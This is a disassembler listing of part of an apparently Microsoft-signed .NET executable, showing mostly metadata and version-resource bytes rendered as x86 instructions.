  40b67b:	add    DWORD PTR [esi],ecx
  40b67d:	sbb    al,0x1c
  40b67f:	add    eax,DWORD PTR [edi]
  40b681:	add    DWORD PTR [esi],ecx
  40b683:	pop    es
  40b684:	and    BYTE PTR [ecx+eax*1],al
  40b687:	push   cs
  40b688:	sbb    al,0x1c
  40b68a:	sbb    al,0x6
  40b68c:	and    BYTE PTR [edx],al
  40b68e:	add    DWORD PTR [esi],ecx
  40b690:	sbb    eax,0x207051c
  40b695:	push   cs
  40b696:	sbb    eax,0x400081c
  40b69b:	or     BYTE PTR [esi],cl
  40b69d:	push   cs
  40b69e:	add    dl,BYTE PTR [edx]
  40b6a0:	and    DWORD PTR [eax+eax*1],eax
  40b6a3:	add    DWORD PTR [ecx],eax
  40b6a5:	or     BYTE PTR [eax+eiz*1],al
  40b6a8:	add    DWORD PTR [edx],eax
  40b6aa:	push   cs
  40b6ab:	add    al,0x20
  40b6ad:	add    DWORD PTR [eax],ecx
  40b6af:	push   cs
  40b6b0:	add    al,0x20
  40b6b2:	add    DWORD PTR [esi],ecx
  40b6b4:	or     BYTE PTR [eax+eiz*1],al
  40b6b7:	add    DWORD PTR [ebx],eax
  40b6b9:	or     BYTE PTR ds:0x3080220,al
  40b6bf:	or     BYTE PTR [esi],al
  40b6c1:	adc    eax,0x12012d12
  40b6c6:	xor    DWORD PTR ds:0x31120100,eax
  40b6cc:	push   cs
  40b6cd:	add    eax,0x13010120
  40b6d2:	add    BYTE PTR ds:0x120e0120,al
  40b6d8:	and    DWORD PTR [esi],esi
  40b6da:	pop    es
  40b6db:	and    al,0x1d
  40b6dd:	push   cs
  40b6de:	sbb    eax,0x834120e
  40b6e3:	add    al,BYTE PTR [edx]
  40b6e5:	add    al,BYTE PTR [edx]
  40b6e7:	or     BYTE PTR [eax],cl
  40b6e9:	push   cs
  40b6ea:	push   cs
  40b6eb:	push   cs
  40b6ec:	or     BYTE PTR [esi],cl
  40b6ee:	push   cs
  40b6ef:	push   cs
  40b6f0:	push   cs
  40b6f1:	or     BYTE PTR [esi],cl
  40b6f3:	adc    dl,BYTE PTR ds:0x1c1d0e08
  40b6f9:	sbb    eax,0x1d1c1d1c
  40b6fe:	sbb    al,0x1d
  40b700:	sbb    al,0x1d
  40b702:	sbb    al,0x1d
  40b704:	sbb    al,0x1d
  40b706:	sbb    al,0x1d
  40b708:	sbb    al,0x1d
  40b70a:	sbb    al,0x1d
  40b70c:	sbb    al,0x1d
  40b70e:	push   cs
  40b70f:	or     BYTE PTR [eax+eiz*1],al
  40b712:	add    DWORD PTR [eax],ecx
  40b714:	add    eax,DWORD PTR [ebx]
  40b716:	pop    es
  40b717:	add    DWORD PTR [eax],ecx
  40b719:	add    eax,0x80120020
  40b71e:	(bad)  [eax]
  40b720:	and    BYTE PTR [ebx],al
  40b722:	add    cl,BYTE PTR [esi]
  40b724:	push   cs
  40b725:	adc    DWORD PTR [eax+0x10705dd],eax
  40b72b:	adc    al,BYTE PTR [eax+0x5d9]
  40b731:	adc    al,BYTE PTR [eax+0x22005e1]
  40b737:	add    DWORD PTR [eax+ebx*1],ebx
  40b73a:	push   es
  40b73b:	and    BYTE PTR [ecx],al
  40b73d:	add    DWORD PTR [edx],edx
  40b73f:	and    ch,0x4
  40b742:	and    BYTE PTR [eax],al
  40b744:	adc    dl,BYTE PTR ds:0x12012006
  40b74a:	sub    ch,0xe
  40b74d:	sub    DWORD PTR [edi],eax
  40b74f:	adc    DWORD PTR [edx],edx
  40b751:	xor    cl,0x12
  40b754:	sub    cl,0x12
  40b757:	cmp    al,0x12
  40b759:	sub    cl,0x12
  40b75c:	adc    eax,0x80121512
  40b761:	in     eax,dx
  40b762:	adc    al,BYTE PTR [eax+0x1d1512f5]
  40b768:	sbb    al,0x1d
  40b76a:	sbb    al,0x1d
  40b76c:	sbb    al,0x1d
  40b76e:	sbb    al,0x1d
  40b770:	sbb    al,0x1d
  40b772:	sbb    al,0x1d
  40b774:	sbb    al,0x1d
  40b776:	sbb    al,0x9
  40b778:	and    BYTE PTR [eax],al
  40b77a:	adc    eax,0x1f98011
  40b77f:	adc    eax,DWORD PTR [eax]
  40b781:	pop    es
  40b782:	adc    eax,0x1f98011
  40b787:	adc    dh,BYTE PTR [ecx]
  40b789:	add    al,0x20
  40b78b:	add    BYTE PTR [ebx],dl
  40b78d:	add    BYTE PTR [eax],cl
  40b78f:	add    BYTE PTR [ebx],al
  40b791:	add    cl,BYTE PTR [esi]
  40b793:	push   cs
  40b794:	adc    DWORD PTR [eax+0x10005fd],eax
  40b79a:	adc    dh,BYTE PTR ds:0x3070d0e
  40b7a0:	adc    dh,BYTE PTR ds:0x11153112
  40b7a6:	cmp    cl,0x1
  40b7a9:	adc    dh,BYTE PTR [ecx]
  40b7ab:	push   es
  40b7ac:	add    BYTE PTR [ecx],al
  40b7ae:	adc    al,BYTE PTR [ecx+0x6020e05]
  40b7b4:	add    eax,DWORD PTR ds:0x1d080120
  40b7ba:	add    eax,DWORD PTR [esi]
  40b7bc:	add    BYTE PTR [ebx],al
  40b7be:	push   cs
  40b7bf:	sbb    al,0x1c
  40b7c1:	sbb    al,0x8
  40b7c3:	mov    al,0x3f
  40b7c5:	pop    edi
  40b7c6:	jg     0x40b7d9
  40b7c8:	aad    0xa
  40b7ca:	cmp    al,BYTE PTR [edi]
  40b7cc:	add    BYTE PTR [edx],al
  40b7ce:	push   cs
  40b7cf:	push   cs
  40b7d0:	adc    al,BYTE PTR [ecx+0x2000505]
  40b7d6:	add    DWORD PTR [esi],ecx
  40b7d8:	sbb    al,0x6
  40b7da:	add    BYTE PTR [ebx],al
  40b7dc:	add    DWORD PTR [esi],ecx
  40b7de:	sbb    al,0x1c
  40b7e0:	push   es
  40b7e1:	add    BYTE PTR [ebx],al
  40b7e3:	push   cs
  40b7e4:	push   cs
  40b7e5:	push   cs
  40b7e6:	push   cs
  40b7e7:	pop    es
  40b7e8:	and    BYTE PTR [edx],al
  40b7ea:	add    cl,BYTE PTR [esi]
  40b7ec:	adc    DWORD PTR [eax+0x60011fd],eax
  40b7f2:	adc    al,BYTE PTR [ecx+0x15811211]
  40b7f8:	push   cs
  40b7f9:	push   cs
  40b7fa:	adc    al,BYTE PTR [ecx+0x1d100205]
  40b800:	push   cs
  40b801:	add    eax,0x81120020
  40b806:	sbb    DWORD PTR ds:0x2010220,eax
  40b80c:	add    al,BYTE PTR [edi]
  40b80e:	and    BYTE PTR [ebx],al
  40b810:	add    DWORD PTR [esi],ecx
  40b812:	add    dl,BYTE PTR [edx]
  40b814:	inc    ebp
  40b815:	or     al,0x20
  40b817:	add    eax,DWORD PTR [ecx]
  40b819:	adc    al,BYTE PTR [ecx-0x3e7fedef]
  40b81f:	adc    al,BYTE PTR [ecx+0x1407251d]
  40b825:	adc    al,BYTE PTR [ecx+0xe080e05]
  40b82b:	push   cs
  40b82c:	push   cs
  40b82d:	push   cs
  40b82e:	sbb    eax,0x120e0e0e
  40b833:	adc    DWORD PTR [ecx],0x121d8112
  40b839:	and    DWORD PTR [ecx],0xec18012
  40b83f:	sbb    eax,0x1d1c1d03
  40b844:	push   cs
  40b845:	or     BYTE PTR ds:0x20051c,bl
  40b84b:	sbb    eax,0x20070013
  40b850:	add    al,BYTE PTR [ecx]
  40b852:	push   cs
  40b853:	sbb    eax,0x70c3112
  40b858:	add    eax,0x81124011
  40b85d:	sub    DWORD PTR [esi],ecx
  40b85f:	adc    DWORD PTR [eax+0x1d],eax
  40b862:	sbb    al,0x5
  40b864:	and    BYTE PTR [eax],al
  40b866:	adc    al,BYTE PTR [ecx+0x200331]
  40b86c:	sbb    al,0x9
  40b86e:	pop    es
  40b86f:	add    al,0x12
  40b871:	xor    DWORD PTR [ecx],0x3d121c0e
  40b877:	push   es
  40b878:	and    BYTE PTR [ecx],al
  40b87a:	adc    al,BYTE PTR [eax+0x200503ed]
  40b880:	add    DWORD PTR [ecx],eax
  40b882:	sbb    eax,0x3000a03
  40b887:	pop    es
  40b888:	push   cs
  40b889:	adc    DWORD PTR [ecx-0x467fedbf],eax
  40b88f:	sbb    eax,DWORD PTR [edi]
  40b891:	movlps xmm7,QWORD PTR [eax]
  40b894:	adc    al,BYTE PTR [eax-0x127fed13]
  40b89a:	or     BYTE PTR [esi],cl
  40b89c:	add    bl,BYTE PTR ds:0x8080803
  40b8a2:	sbb    eax,0x81c1d1c
  40b8a7:	sbb    eax,0x61c1d1c
  40b8ac:	pop    es
  40b8ad:	add    dl,BYTE PTR [ecx]
  40b8af:	inc    eax
  40b8b0:	adc    DWORD PTR [eax+0x5],eax
  40b8b3:	and    BYTE PTR [eax],al
  40b8b5:	adc    al,BYTE PTR [ecx+0x5070c35]
  40b8bb:	adc    al,BYTE PTR [esi+ecx*1+0x1c]
  40b8bf:	adc    al,BYTE PTR [ecx+0x1811235]
  40b8c5:	add    al,0x0
  40b8c7:	add    BYTE PTR [edx],dl
  40b8c9:	inc    ebp
  40b8ca:	add    eax,0xe0e0220
  40b8cf:	push   cs
  40b8d0:	adc    al,BYTE PTR [edi]
  40b8d2:	or     BYTE PTR [edx],dl
  40b8d4:	and    DWORD PTR ds:0x1c0e4412,0x3581120e
  40b8de:	sbb    eax,0x181121c
  40b8e3:	add    eax,0x81120000
  40b8e8:	dec    ebp
  40b8e9:	push   es
  40b8ea:	add    BYTE PTR [eax],al
  40b8ec:	sbb    eax,0x4518112
  40b8f1:	and    BYTE PTR [eax],al
  40b8f3:	sbb    eax,0x5070c0e
  40b8f8:	sbb    eax,0x8518112
  40b8fd:	sbb    eax,0x1c1d080e
  40b902:	add    eax,0x81120000
  40b907:	push   ebp
  40b908:	push   es
  40b909:	and    BYTE PTR [ecx],al
  40b90b:	add    DWORD PTR [edx],edx
  40b90d:	sbb    DWORD PTR [ecx+0x4],0x8080207
  40b914:	add    eax,0x1
  40b919:	add    BYTE PTR ds:0x10001,al
  40b91f:	add    BYTE PTR [edi],cl
  40b921:	add    DWORD PTR [eax],eax
  40b923:	or     dl,BYTE PTR [edx+0x65]
  40b926:	jae    0x40b96f
  40b928:	outs   dx,BYTE PTR gs:[esi]
  40b92a:	cs gs js 0x40b993
  40b92e:	add    BYTE PTR [eax],al
  40b930:	sbb    al,BYTE PTR [ecx]
  40b932:	add    BYTE PTR ds:0x7263694d,dl
  40b938:	outs   dx,DWORD PTR ds:[esi]
  40b939:	jae    0x40b9aa
  40b93b:	data16 je 0x40b95e
  40b93e:	inc    ebx
  40b93f:	outs   dx,DWORD PTR ds:[esi]
  40b940:	jb     0x40b9b2
  40b942:	outs   dx,DWORD PTR ds:[esi]
  40b943:	jb     0x40b9a6
  40b945:	je     0x40b9b0
  40b947:	outs   dx,DWORD PTR ds:[esi]
  40b948:	outs   dx,BYTE PTR ds:[esi]
  40b949:	add    BYTE PTR [eax],al
  40b94b:	pop    ds
  40b94c:	add    DWORD PTR [eax],eax
  40b94e:	sbb    cl,BYTE PTR [ebp+0x69]
  40b951:	arpl   WORD PTR [edx+0x6f],si
  40b954:	jae    0x40b9c5
  40b956:	data16 je 0x40b91b
  40b959:	scas   al,BYTE PTR es:[edi]
  40b95a:	and    BYTE PTR [esi],ch
  40b95c:	dec    esi
  40b95d:	inc    ebp
  40b95e:	push   esp
  40b95f:	and    BYTE PTR [esi+0x72],al
  40b962:	popa   
  40b963:	ins    DWORD PTR es:[edi],dx
  40b964:	gs ja  0x40b9d6
  40b967:	jb     0x40b9d4
  40b969:	add    BYTE PTR [eax],al
  40b96b:	xor    al,0x1
  40b96d:	add    BYTE PTR [edi],ch
  40b96f:	ret    0x20a9
  40b972:	dec    ebp
  40b973:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40b97a:	je     0x40b99c
  40b97c:	inc    ebx
  40b97d:	outs   dx,DWORD PTR ds:[esi]
  40b97e:	jb     0x40b9f0
  40b980:	outs   dx,DWORD PTR ds:[esi]
  40b981:	jb     0x40b9e4
  40b983:	je     0x40b9ee
  40b985:	outs   dx,DWORD PTR ds:[esi]
  40b986:	outs   dx,BYTE PTR ds:[esi]
  40b987:	and    BYTE PTR cs:[eax],ah
  40b98a:	inc    ecx
  40b98b:	ins    BYTE PTR es:[edi],dx
  40b98c:	ins    BYTE PTR es:[edi],dx
  40b98d:	and    BYTE PTR [edx+0x69],dh
  40b990:	addr16 push 0x72207374
  40b996:	gs jae 0x40b9fe
  40b999:	jb     0x40ba11
  40b99b:	gs fs add BYTE PTR cs:[eax],al
  40b9a0:	adc    eax,DWORD PTR [ecx]
  40b9a2:	add    BYTE PTR [esi],cl
  40b9a4:	xor    ebp,DWORD PTR [esi]
  40b9a6:	xor    eax,0x3730332e
  40b9ab:	xor    bh,BYTE PTR [ecx]
  40b9ad:	cs xor al,0x35
  40b9b0:	xor    BYTE PTR [edi],dh
  40b9b2:	add    BYTE PTR [eax],al
  40b9b4:	or     al,0x1
  40b9b6:	add    BYTE PTR [edi],al
  40b9b8:	xor    ebp,DWORD PTR [esi]
  40b9ba:	xor    eax,0x302e302e
  40b9bf:	add    BYTE PTR [eax],al
  40b9c1:	or     al,BYTE PTR [ecx]
  40b9c3:	add    BYTE PTR ds:0x552d6e65,al
  40b9c9:	push   ebx
  40b9ca:	add    BYTE PTR [eax],al
  40b9cc:	sub    al,BYTE PTR [ecx]
  40b9ce:	add    BYTE PTR ds:0x645c3a66,ah
  40b9d4:	fs pop esp
  40b9d6:	push   esp
  40b9d7:	outs   dx,DWORD PTR ds:[esi]
  40b9d8:	outs   dx,DWORD PTR ds:[esi]
  40b9d9:	ins    BYTE PTR es:[edi],dx
  40b9da:	jae    0x40ba38
  40b9dc:	fs gs jbe 0x40ba44
  40b9e0:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40b9e7:	ins    BYTE PTR es:[edi],dx
  40b9e8:	push   eax
  40b9e9:	jne    0x40ba4d
  40b9eb:	ins    BYTE PTR es:[edi],dx
  40b9ec:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40b9f3:	outs   dx,BYTE PTR ds:[esi]
  40b9f4:	imul   eax,DWORD PTR [eax],0x0
  40b9f7:	or     BYTE PTR [ecx],al
  40b9f9:	add    BYTE PTR [edx],al
  40b9fb:	add    BYTE PTR [eax],al
  40b9fd:	add    BYTE PTR [eax],al
  40b9ff:	add    BYTE PTR [eax],cl
  40ba01:	add    DWORD PTR [eax],eax
  40ba03:	or     BYTE PTR [eax],al
  40ba05:	add    BYTE PTR [eax],al
  40ba07:	add    BYTE PTR [eax],al
  40ba09:	push   ds
  40ba0a:	add    DWORD PTR [eax],eax
  40ba0c:	add    DWORD PTR [eax],eax
  40ba0e:	push   esp
  40ba0f:	add    dl,BYTE PTR [esi]
  40ba11:	push   edi
  40ba12:	jb     0x40ba75
  40ba14:	jo     0x40ba64
  40ba16:	outs   dx,DWORD PTR ds:[esi]
  40ba17:	outs   dx,BYTE PTR ds:[esi]
  40ba18:	inc    ebp
  40ba19:	js     0x40ba7e
  40ba1b:	gs jo  0x40ba92
  40ba1e:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40ba25:	ja     0x40ba9a
  40ba27:	add    DWORD PTR [eax],eax
  40ba29:	add    BYTE PTR [eax],al
  40ba2b:	add    BYTE PTR [eax+0x4b9707],ah
  40ba31:	add    BYTE PTR [eax],al
  40ba33:	add    BYTE PTR [edx],al
  40ba35:	add    BYTE PTR [eax],al
  40ba37:	add    BYTE PTR [ebx],ah
  40ba39:	add    BYTE PTR [eax],al
  40ba3b:	add    BYTE PTR [edx+edi*4+0x0],al
  40ba3f:	add    BYTE PTR [edx+ebp*4+0x0],al
  40ba43:	add    BYTE PTR [edx+0x53],dl
  40ba46:	inc    esp
  40ba47:	push   ebx
  40ba48:	fld    QWORD PTR [esi]
  40ba4a:	out    0x7d,eax
  40ba4c:	das    
  40ba4d:	pop    esp
  40ba4e:	mov    al,ds:0x9598914d
  40ba53:	clc    
  40ba54:	mov    cl,0xd2
  40ba56:	mov    BYTE PTR [esi],dh
  40ba58:	add    DWORD PTR [eax],eax
  40ba5a:	add    BYTE PTR [eax],al
  40ba5c:	push   edx
  40ba5d:	gs jae 0x40baa7
  40ba60:	outs   dx,BYTE PTR gs:[esi]
  40ba62:	cs jo  0x40bac9
  40ba65:	bound  eax,QWORD PTR [eax]
	...
  40ba97:	add    al,al
  40ba99:	mov    edx,0x0
  40ba9e:	add    BYTE PTR [eax],al
  40baa0:	add    BYTE PTR [eax],al
  40baa2:	add    BYTE PTR [eax],al
  40baa4:	fidivr WORD PTR [edx+0x20000000]
	...
  40babe:	add    BYTE PTR [eax],al
  40bac0:	sar    BYTE PTR [edx+0x0],1
	...
  40bad2:	pop    edi
  40bad3:	inc    ebx
  40bad4:	outs   dx,DWORD PTR ds:[esi]
  40bad5:	jb     0x40bb1c
  40bad7:	js     0x40bb3e
  40bad9:	dec    ebp
  40bada:	popa   
  40badb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40bae2:	jb     0x40bb49
  40bae4:	gs cs fs ins BYTE PTR es:[edi],dx
  40bae8:	ins    BYTE PTR es:[edi],dx
  40bae9:	add    BYTE PTR [eax],al
  40baeb:	add    BYTE PTR [eax],al
  40baed:	add    bh,bh
  40baef:	and    eax,0x402000

Disassembly of section .rsrc:

0040c000 <.rsrc>:
	...
  40c00c:	add    BYTE PTR [eax],al
  40c00e:	add    al,BYTE PTR [eax]
  40c010:	adc    BYTE PTR [eax],al
  40c012:	add    BYTE PTR [eax],al
  40c014:	and    BYTE PTR [eax],al
  40c016:	add    BYTE PTR [eax+0x18],al
  40c01c:	cmp    BYTE PTR [eax],al
  40c01e:	add    BYTE PTR [eax+0x0],al
	...
  40c02c:	add    BYTE PTR [eax],al
  40c02e:	add    DWORD PTR [eax],eax
  40c030:	add    DWORD PTR [eax],eax
  40c032:	add    BYTE PTR [eax],al
  40c034:	push   eax
  40c035:	add    BYTE PTR [eax],al
  40c037:	add    BYTE PTR [eax],0x0
	...
  40c046:	add    DWORD PTR [eax],eax
  40c048:	add    DWORD PTR [eax],eax
  40c04a:	add    BYTE PTR [eax],al
  40c04c:	push   0x800000
	...
  40c05d:	add    BYTE PTR [ecx],al
  40c05f:	add    BYTE PTR [ecx],cl
  40c061:	add    al,0x0
  40c063:	add    BYTE PTR [eax+0x0],al
	...
  40c075:	add    BYTE PTR [ecx],al
  40c077:	add    BYTE PTR [ecx],cl
  40c079:	add    al,0x0
  40c07b:	add    BYTE PTR [eax-0x60000000],dl
  40c081:	rol    BYTE PTR [eax],0x0
  40c084:	fadd   DWORD PTR [ebx]
	...
  40c08e:	add    BYTE PTR [eax],al
  40c090:	js     0x40c056
  40c092:	add    BYTE PTR [eax],al
  40c094:	jg     0x40c097
	...
  40c09e:	add    BYTE PTR [eax],al
  40c0a0:	fadd   DWORD PTR [ebx]
  40c0a2:	xor    al,0x0
  40c0a4:	add    BYTE PTR [eax],al
  40c0a6:	push   esi
  40c0a7:	add    BYTE PTR [ebx+0x0],dl
  40c0aa:	pop    edi
  40c0ab:	add    BYTE PTR [esi+0x0],dl
  40c0ae:	inc    ebp
  40c0af:	add    BYTE PTR [edx+0x0],dl
  40c0b2:	push   ebx
  40c0b3:	add    BYTE PTR [ecx+0x0],cl
  40c0b6:	dec    edi
  40c0b7:	add    BYTE PTR [esi+0x0],cl
  40c0ba:	pop    edi
  40c0bb:	add    BYTE PTR [ecx+0x0],cl
  40c0be:	dec    esi
  40c0bf:	add    BYTE PTR [esi+0x0],al
  40c0c2:	dec    edi
  40c0c3:	add    BYTE PTR [eax],al
  40c0c5:	add    BYTE PTR [eax],al
  40c0c7:	add    BYTE PTR [ebp+0xfeef04],bh
  40c0cd:	add    BYTE PTR [ecx],al
  40c0cf:	add    BYTE PTR ds:0x9b000300,al
  40c0d5:	adc    DWORD PTR [ecx],ecx
  40c0d7:	js     0x40c0de
  40c0d9:	add    BYTE PTR [ebx],al
  40c0db:	add    BYTE PTR [ebx+0x3f780911],bl
  40c0e1:	add    BYTE PTR [eax],al
  40c0e3:	add    BYTE PTR [eax],cl
  40c0e5:	add    BYTE PTR [eax],al
  40c0e7:	add    BYTE PTR [eax+eax*1],al
  40c0ea:	add    BYTE PTR [eax],al
  40c0ec:	add    DWORD PTR [eax],eax
	...
  40c0fa:	add    BYTE PTR [eax],al
  40c0fc:	add    eax,DWORD PTR ss:[eax]
  40c0ff:	add    BYTE PTR [ecx],al
  40c101:	add    BYTE PTR [ebx+0x0],dl
  40c104:	je     0x40c106
  40c106:	jb     0x40c108
  40c108:	imul   eax,DWORD PTR [eax],0x67006e
  40c10e:	inc    esi
  40c10f:	add    BYTE PTR [ecx+0x0],ch
  40c112:	ins    BYTE PTR es:[edi],dx
  40c113:	add    BYTE PTR [ebp+0x0],ah
  40c116:	dec    ecx
  40c117:	add    BYTE PTR [esi+0x0],ch
  40c11a:	data16 add BYTE PTR [edi+0x0],ch
  40c11e:	add    BYTE PTR [eax],al
  40c120:	adc    al,BYTE PTR [ebx]
  40c122:	add    BYTE PTR [eax],al
  40c124:	add    DWORD PTR [eax],eax
  40c126:	xor    BYTE PTR [eax],al
  40c128:	xor    al,0x0
  40c12a:	xor    BYTE PTR [eax],al
  40c12c:	cmp    DWORD PTR [eax],eax
  40c12e:	xor    BYTE PTR [eax],al
  40c130:	xor    al,0x0
  40c132:	inc    edx
  40c133:	add    BYTE PTR [eax],dh
  40c135:	add    BYTE PTR [eax],al
  40c137:	add    BYTE PTR [eax+eax*1+0x16],cl
  40c13b:	add    BYTE PTR [ecx],al
  40c13d:	add    BYTE PTR [ebx+0x0],al
  40c140:	outs   dx,DWORD PTR ds:[esi]
  40c141:	add    BYTE PTR [ebp+0x0],ch
  40c144:	jo     0x40c146
  40c146:	popa   
  40c147:	add    BYTE PTR [esi+0x0],ch
  40c14a:	jns    0x40c14c
  40c14c:	dec    esi
  40c14d:	add    BYTE PTR [ecx+0x0],ah
  40c150:	ins    DWORD PTR es:[edi],dx
  40c151:	add    BYTE PTR [ebp+0x0],ah
  40c154:	add    BYTE PTR [eax],al
  40c156:	add    BYTE PTR [eax],al
  40c158:	dec    ebp
  40c159:	add    BYTE PTR [ecx+0x0],ch
  40c15c:	arpl   WORD PTR [eax],ax
  40c15e:	jb     0x40c160
  40c160:	outs   dx,DWORD PTR ds:[esi]
  40c161:	add    BYTE PTR [ebx+0x0],dh
  40c164:	outs   dx,DWORD PTR ds:[esi]
  40c165:	add    BYTE PTR [esi+0x0],ah
  40c168:	je     0x40c16a
  40c16a:	and    BYTE PTR [eax],al
  40c16c:	inc    ebx
  40c16d:	add    BYTE PTR [edi+0x0],ch
  40c170:	jb     0x40c172
  40c172:	jo     0x40c174
  40c174:	outs   dx,DWORD PTR ds:[esi]
  40c175:	add    BYTE PTR [edx+0x0],dh
  40c178:	popa   
  40c179:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c17d:	add    BYTE PTR [edi+0x0],ch
  40c180:	outs   dx,BYTE PTR ds:[esi]
  40c181:	add    BYTE PTR [eax],al
  40c183:	add    BYTE PTR [eax+0x0],dl
  40c186:	adc    al,0x0
  40c188:	add    DWORD PTR [eax],eax
  40c18a:	inc    esi
  40c18b:	add    BYTE PTR [ecx+0x0],ch
  40c18e:	ins    BYTE PTR es:[edi],dx
  40c18f:	add    BYTE PTR [ebp+0x0],ah
  40c192:	inc    esp
  40c193:	add    BYTE PTR [ebp+0x0],ah
  40c196:	jae    0x40c198
  40c198:	arpl   WORD PTR [eax],ax
  40c19a:	jb     0x40c19c
  40c19c:	imul   eax,DWORD PTR [eax],0x740070
  40c1a2:	imul   eax,DWORD PTR [eax],0x6e006f
  40c1a8:	add    BYTE PTR [eax],al
  40c1aa:	add    BYTE PTR [eax],al
  40c1ac:	push   edx
  40c1ad:	add    BYTE PTR [ebp+0x0],ah
  40c1b0:	jae    0x40c1b2
  40c1b2:	pop    eax
  40c1b3:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40c1b7:	add    BYTE PTR [edx+0x0],dl
  40c1ba:	add    BYTE PTR gs:[ebx+0x0],dh
  40c1be:	outs   dx,DWORD PTR ds:[esi]
  40c1bf:	add    BYTE PTR [ebp+0x0],dh
  40c1c2:	jb     0x40c1c4
  40c1c4:	arpl   WORD PTR [eax],ax
  40c1c6:	add    BYTE PTR gs:[ebx+0x0],dh
  40c1ca:	add    BYTE PTR cs:[ebp+0x0],ah
  40c1ce:	js     0x40c1d0
  40c1d0:	add    BYTE PTR gs:[eax],al
  40c1d3:	add    BYTE PTR [edx+0x0],ah
  40c1d6:	and    DWORD PTR [eax],eax
  40c1d8:	add    DWORD PTR [eax],eax
  40c1da:	inc    esi
  40c1db:	add    BYTE PTR [ecx+0x0],ch
  40c1de:	ins    BYTE PTR es:[edi],dx
  40c1df:	add    BYTE PTR [ebp+0x0],ah
  40c1e2:	push   esi
  40c1e3:	add    BYTE PTR [ebp+0x0],ah
  40c1e6:	jb     0x40c1e8
  40c1e8:	jae    0x40c1ea
  40c1ea:	imul   eax,DWORD PTR [eax],0x6e006f
  40c1f0:	add    BYTE PTR [eax],al
  40c1f2:	add    BYTE PTR [eax],al
  40c1f4:	xor    eax,DWORD PTR [eax]
  40c1f6:	add    BYTE PTR cs:0x33002e00,dh
  40c1fd:	add    BYTE PTR [eax],dh
  40c1ff:	add    BYTE PTR [edi],dh
  40c201:	add    BYTE PTR [edx],dh
  40c203:	add    BYTE PTR [ecx],bh
  40c205:	add    BYTE PTR [esi],ch
  40c207:	add    BYTE PTR [eax+eax*1],dh
  40c20a:	xor    eax,0x37003000
  40c20f:	add    BYTE PTR [eax],ah
  40c211:	add    BYTE PTR [eax],ch
  40c213:	add    BYTE PTR [ecx+0x0],dl
  40c216:	inc    esi
  40c217:	add    BYTE PTR [ebp+0x0],al
  40c21a:	add    BYTE PTR cs:[eax],dh
  40c21d:	add    BYTE PTR [ebx],dh
  40c21f:	add    BYTE PTR [eax],dh
  40c221:	add    BYTE PTR [edi],dh
  40c223:	add    BYTE PTR [edx],dh
  40c225:	add    BYTE PTR [ecx],bh
  40c227:	add    BYTE PTR ds:0x35003400,ch
  40c22d:	add    BYTE PTR [eax],dh
  40c22f:	add    BYTE PTR [eax],dh
  40c231:	add    BYTE PTR [ecx],ch
  40c233:	add    BYTE PTR [eax],al
  40c235:	add    BYTE PTR [eax],al
  40c237:	add    BYTE PTR [esi],dh
  40c239:	add    BYTE PTR [ebx],cl
  40c23b:	add    BYTE PTR [ecx],al
  40c23d:	add    BYTE PTR [ecx+0x0],cl
  40c240:	outs   dx,BYTE PTR ds:[esi]
  40c241:	add    BYTE PTR [eax+eax*1+0x65],dh
  40c245:	add    BYTE PTR [edx+0x0],dh
  40c248:	outs   dx,BYTE PTR ds:[esi]
  40c249:	add    BYTE PTR [ecx+0x0],ah
  40c24c:	ins    BYTE PTR es:[edi],dx
  40c24d:	add    BYTE PTR [esi+0x0],cl
  40c250:	popa   
  40c251:	add    BYTE PTR [ebp+0x0],ch
  40c254:	add    BYTE PTR gs:[eax],al
  40c257:	add    BYTE PTR [edx+0x0],dl
  40c25a:	add    BYTE PTR gs:[ebx+0x0],dh
  40c25e:	inc    edi
  40c25f:	add    BYTE PTR [ebp+0x0],ah
  40c262:	outs   dx,BYTE PTR ds:[esi]
  40c263:	add    BYTE PTR [esi],ch
  40c265:	add    BYTE PTR [ebp+0x0],ah
  40c268:	js     0x40c26a
  40c26a:	add    BYTE PTR gs:[eax],al
  40c26d:	add    BYTE PTR [eax],al
  40c26f:	add    BYTE PTR [edx+0x1002f00],al
  40c275:	add    BYTE PTR [eax+eax*1+0x65],cl
  40c279:	add    BYTE PTR [edi+0x0],ah
  40c27c:	popa   
  40c27d:	add    BYTE PTR [eax+eax*1+0x43],ch
  40c281:	add    BYTE PTR [edi+0x0],ch
  40c284:	jo     0x40c286
  40c286:	jns    0x40c288
  40c288:	jb     0x40c28a
  40c28a:	imul   eax,DWORD PTR [eax],0x680067
  40c290:	je     0x40c292
  40c292:	add    BYTE PTR [eax],al
  40c294:	test   eax,0x4d002000
  40c299:	add    BYTE PTR [ecx+0x0],ch
  40c29c:	arpl   WORD PTR [eax],ax
  40c29e:	jb     0x40c2a0
  40c2a0:	outs   dx,DWORD PTR ds:[esi]
  40c2a1:	add    BYTE PTR [ebx+0x0],dh
  40c2a4:	outs   dx,DWORD PTR ds:[esi]
  40c2a5:	add    BYTE PTR [esi+0x0],ah
  40c2a8:	je     0x40c2aa
  40c2aa:	and    BYTE PTR [eax],al
  40c2ac:	inc    ebx
  40c2ad:	add    BYTE PTR [edi+0x0],ch
  40c2b0:	jb     0x40c2b2
  40c2b2:	jo     0x40c2b4
  40c2b4:	outs   dx,DWORD PTR ds:[esi]
  40c2b5:	add    BYTE PTR [edx+0x0],dh
  40c2b8:	popa   
  40c2b9:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c2bd:	add    BYTE PTR [edi+0x0],ch
  40c2c0:	outs   dx,BYTE PTR ds:[esi]
  40c2c1:	add    BYTE PTR [esi],ch
  40c2c3:	add    BYTE PTR [eax],ah
  40c2c5:	add    BYTE PTR [eax],ah
  40c2c7:	add    BYTE PTR [ecx+0x0],al
  40c2ca:	ins    BYTE PTR es:[edi],dx
  40c2cb:	add    BYTE PTR [eax+eax*1+0x20],ch
  40c2cf:	add    BYTE PTR [edx+0x0],dh
  40c2d2:	imul   eax,DWORD PTR [eax],0x680067
  40c2d8:	je     0x40c2da
  40c2da:	jae    0x40c2dc
  40c2dc:	and    BYTE PTR [eax],al
  40c2de:	jb     0x40c2e0
  40c2e0:	add    BYTE PTR gs:[ebx+0x0],dh
  40c2e4:	add    BYTE PTR gs:[edx+0x0],dh
  40c2e8:	jbe    0x40c2ea
